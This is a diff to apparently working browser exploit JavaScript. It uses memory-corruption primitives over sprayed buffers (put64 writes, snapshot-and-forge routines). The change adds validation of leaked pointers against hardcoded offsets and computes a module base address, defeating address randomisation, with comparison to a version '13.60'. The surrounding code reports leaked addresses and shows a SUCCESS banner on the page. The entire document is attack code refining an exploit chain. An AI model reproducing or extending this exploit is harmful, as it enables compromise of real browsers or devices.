@@ -142,6 +142,15 @@ function phase(){
             put64(vb2,0x7A,self+0x90n);put32(vb2,0x90,3);put32(vb2,0x94,72);put64(vb2,0x98,self+0x30n);
           }
         }
+        function validWalkSlots(VP,S0,S1,S2,S3,S4,S5,S6,S7){
+          var ptrs=[VP,S0,S1,S2,S3,S4,S5,S6,S7];
+          for(var vi=0;vi<ptrs.length;vi++){if(ptrs[vi]<=0x100000000n)return false;}
+          return S1===S0+0x30n &&
+                 S2===S4 && S2===S5 &&
+                 VP-S0===0x1710B78n && VP-S1===0x1710B48n &&
+                 VP-S2===0x324C3D8n && VP-S3===0x1710478n &&
+                 VP-S6===0x1ABA728n && VP-S7===0x1710318n;
+        }
         function restoreAndForge(snap,daddr,dlen){
           for(var ib3=0;ib3<window.__sp.length;ib3++){
             var vb3=window.__sp[ib3];if(!vb3)continue;
@@ -196,7 +205,7 @@ function phase(){
                 S0=readLeHex(h4,0);S1=readLeHex(h4,8);S2=readLeHex(h4,16);
                 S3=readLeHex(h4,24);S4=readLeHex(h4,32);S5=readLeHex(h4,40);
                 S6=readLeHex(h4,48);S7=readLeHex(h4,56);S8=readLeHex(h4,64);
-                walkOK=true;
+                walkOK=validWalkSlots(VP,S0,S1,S2,S3,S4,S5,S6,S7);
               }
             }
           }
@@ -205,27 +214,28 @@ function phase(){
         // Restore
         for(var rr=0;rr<window.__sp.length;rr++){var rrv=window.__sp[rr];if(!rrv)continue;for(var rr2=0;rr2<SIZE;rr2++)rrv[rr2]=snap2[rr2];}
 
-        // Report ALL data
-        var BASE=walkOK?VP-0xC6A1B28n:0n;
+        // Report ALL data. BASE is the probe's assumption, not an independent
+        // measurement; the offline parser keeps address inference unresolved.
+        var ASSUMED_BASE=walkOK?VP-0xC6A1B28n:0n;
         bs('WALK-ok='+walkOK);
         bs('VP-'+hex(VP));
-        bs('BASE-'+hex(BASE));
+        bs('BASE-'+hex(ASSUMED_BASE));
         bs('S0-'+hex(S0));bs('S1-'+hex(S1));bs('S2-'+hex(S2));
         bs('S3-'+hex(S3));bs('S4-'+hex(S4));bs('S5-'+hex(S5));
         bs('S6-'+hex(S6));bs('S7-'+hex(S7));
 
-        // Compute RVAs for comparison with 13.60
-        if(BASE>0n){
-          bs('S0_RVA-'+hex(S0-BASE));
-          bs('S2_RVA-'+hex(S2-BASE));
-          bs('S6_RVA-'+hex(S6-BASE));
-          bs('VP_RVA-'+hex(VP-BASE));
+        // Compute assumption-relative RVAs for comparison only.
+        if(ASSUMED_BASE>0n){
+          bs('S0_RVA-'+hex(S0-ASSUMED_BASE));
+          bs('S2_RVA-'+hex(S2-ASSUMED_BASE));
+          bs('S6_RVA-'+hex(S6-ASSUMED_BASE));
+          bs('VP_RVA-'+hex(VP-ASSUMED_BASE));
         }
 
         var v=document.getElementById('verdict');
         if(walkOK){
           v.style.background='#e3f5e6';v.style.color='#0f5a20';
-          v.innerHTML='SUCCESS — VP='+hex(VP)+' BASE='+hex(BASE);
+          v.innerHTML='SUCCESS — VP='+hex(VP)+'; base RVA unresolved';
           b('COMPLETE');
         }else{
           v.style.background='#fde2e1';v.style.color='#8c1010';
